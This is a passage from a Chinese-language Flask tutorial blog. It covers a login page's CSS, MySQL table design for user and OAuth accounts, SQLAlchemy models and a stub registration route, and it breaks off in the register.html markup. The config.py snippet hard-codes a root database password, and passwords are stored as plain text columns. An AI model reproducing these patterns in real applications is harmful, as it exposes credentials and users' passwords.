hexcode">#f9f9f9</span><span class="token punctuation">;</span>    <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">1.5</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#24292e</span><span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">a</span><span class="token punctuation">{</span>    <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 盒子 top  */</span><span class="token selector"><span class="token class">.div_container_top</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_container_top_center</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span><span class="token number">310</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">170</span>px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_container_top_logo</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">85</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_container_top_logo</span> img</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">85</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_container_top_word</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">310</span>px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">50</span>px auto <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Consolas'</span>, <span class="token string">'Deja Vu Sans Mono'</span>, <span class="token string">'Bitstream Vera Sans Mono'</span>, monospace<span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">24</span>px<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">;</span>    <span class="token property">letter-spacing</span><span class="token punctuation">:</span> -<span class="token number">0.5</span>px<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 盒子 main */</span><span class="token selector"><span class="token class">.div_container_main</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_container_main_center</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">310</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">310</span>px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#d8dee2</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_first</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_first_word</span></span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">13</span>px<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_second</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token selector"><span class="token class">.search</span></span><span class="token punctuation">{</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.search</span> input</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">270</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#d1d5da</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">3</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_third</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_third_word1</span></span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">16</span>px<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span><span class="token number">600</span><span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_third_word2</span></span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">12</span>px<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0366d6</span><span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">600</span><span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_fourth</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_fifth</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">10</span>px   <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_fifth_word1</span></span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">12</span>px<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0366d6</span><span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">600</span><span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_sixth</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.search1</span></span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.search1</span> input</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">140</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">35</span>px<span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#d1d5da</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">3</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_sixth_img</span></span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_seventh</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_seventh_button</span></span><span class="token punctuation">{</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">8</span>px <span class="token number">12</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_seventh</span> input</span><span class="token punctuation">{</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span><span class="token number">600</span><span class="token punctuation">;</span>    <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">248</span>px<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#269f42</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">0.25</span>em<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>-<span class="token number">188</span>deg, <span class="token hexcode">#34d058</span> <span class="token number">0%</span>, <span class="token hexcode">#28a745</span> <span class="token number">90%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">27</span>, <span class="token number">31</span>, <span class="token number">35</span>, <span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 盒子 foot */</span><span class="token selector"><span class="token class">.div_container_foot</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_foot_main</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">310</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">90</span>px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#f9f9f9</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_main_eighth</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">310</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#f9f9f9</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#0366d6</span><span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#d8dee2</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">0.25</span>em<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_eighth_word1</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">150</span>px<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#d8dee2</span><span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.div_eighth_word2</span></span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span><span class="token number">150</span>px<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#0366d6</span><span class="token punctuation">;</span>    <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="7-创建数据库映射"><a href="#7-创建数据库映射" class="headerlink" title="7.创建数据库映射"></a>7.创建数据库映射</h3><blockquote><p>接下来会做注册页面,在写<code>html</code>之前,最好把要映射的<code>mysql</code>表确定下来.</p><p>需求:</p><ul><li>支持多种注册:最基本的用户名密码模式,还支持<code>QQ\wechat</code>,微博,<code>github</code>等等.</li><li>可进行绑定和解绑或者更换绑定:用户使用任意方式登录后可绑定和解绑或者更换绑定其他 登录授权</li><li>支持<code>unionid</code>:主要用于<code>qq\wechat</code>.如果开发者拥有多个移动应用,网站应用和公众帐号,可通过获取用户基本信息中的 <code>unionid</code> 来区分用户的唯一性,因为只要是同一个微信开放平台帐号下的移动应用,网站应用和公众帐号,用户的<code>unionid</code> 是唯一的.</li></ul><hr><p>表设计:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">use</span> sqlalchemy<span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 主表 users表</span><span class="token keyword">create</span> <span class="token keyword">table</span> demo_login_users <span class="token punctuation">(</span>    id <span class="token keyword">INT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span> <span class="token keyword">COMMENT</span> <span class="token string">'用户唯一索引'</span><span class="token punctuation">,</span>    name <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'用户昵称'</span><span class="token punctuation">,</span>    phone <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span> <span class="token keyword">COMMENT</span> <span class="token string">'手机号'</span><span class="token punctuation">,</span>    password <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">COMMENT</span> <span class="token string">'密码'</span><span class="token punctuation">,</span>    create_time <span class="token keyword">DATETIME</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'创建时间'</span><span class="token punctuation">,</span>    update_time <span class="token keyword">DATETIME</span> <span class="token keyword">COMMENT</span> <span class="token string">'更新时间'</span><span class="token punctuation">)</span><span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">INNODB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span> UTF8 <span class="token keyword">comment</span> <span class="token string">"用户表"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 第三方信息表 oauths</span><span class="token keyword">create</span> <span class="token keyword">table</span> demo_login_oauths<span class="token punctuation">(</span>    id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span> <span class="token keyword">comment</span> <span class="token string">"索引值"</span><span class="token punctuation">,</span>    user_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">comment</span> <span class="token string">"用户ID"</span><span class="token punctuation">,</span>    oauth_type <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">comment</span>    <span class="token string">"第三方登录类型/qq/wechat/github"</span><span class="token punctuation">,</span>    oauth_id <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">comment</span> <span class="token string">"第三方id"</span><span class="token punctuation">,</span>    unionid <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">comment</span> <span class="token string">"qq/wechat unionid"</span><span class="token punctuation">,</span>    credential <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">comment</span> <span class="token string">"access token"</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> fk_oauths_users <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>    <span class="token keyword">references</span> demo_login_users<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">INNODB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span> UTF8 <span class="token keyword">comment</span> <span class="token string">"第三方表"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 用户扩展表</span><span class="token keyword">create</span> <span class="token keyword">table</span> demo_login_users_extends<span class="token punctuation">(</span>    id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">comment</span> <span class="token string">"扩展表"</span><span class="token punctuation">,</span>    user_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">comment</span> <span class="token string">"用户ID"</span><span class="token punctuation">,</span>    field <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">comment</span> <span class="token string">"扩展字段"</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> fk_usersExtends_users <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>    <span class="token keyword">references</span> demo_login_users<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">INNODB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span> UTF8 <span class="token keyword">comment</span> <span class="token string">"扩展表,可记录用户的等级,生日,座右铭,等等"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>创建<code>ORM</code>映射:</p><ul><li>创建<code>exts.py</code>用来存放<code>flask_sqlalchemy</code>.</li><li>主<code>app.py</code>中绑定<code>db</code></li><li>创建<code>flask_sqlalchemy</code>配置文件在<code>config.py</code>中</li><li>创建<code>model.py</code>用来存放所有的<code>ORM</code>映射.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># exts.py</span><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemydb <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py 添加</span><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token comment" spellcheck="true"># db绑定app</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py 添加</span>DB_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span> <span class="token comment" spellcheck="true"># 确保数据库存在</span><span class="token comment" spellcheck="true"># 指定数据库连接</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> DB_URISQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># models.py</span><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token comment" spellcheck="true"># 创建Model</span><span class="token keyword">class</span> <span class="token class-name">Demo_Login_Users</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'demo_login_users'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    phone <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>DateTime<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">)</span>    update_time <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>DateTime<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>创建<code>register</code>:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建和修改<code>register.html</code>,沿用<code>login.html</code>的基本骨架,然后填入想要的信息.</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token 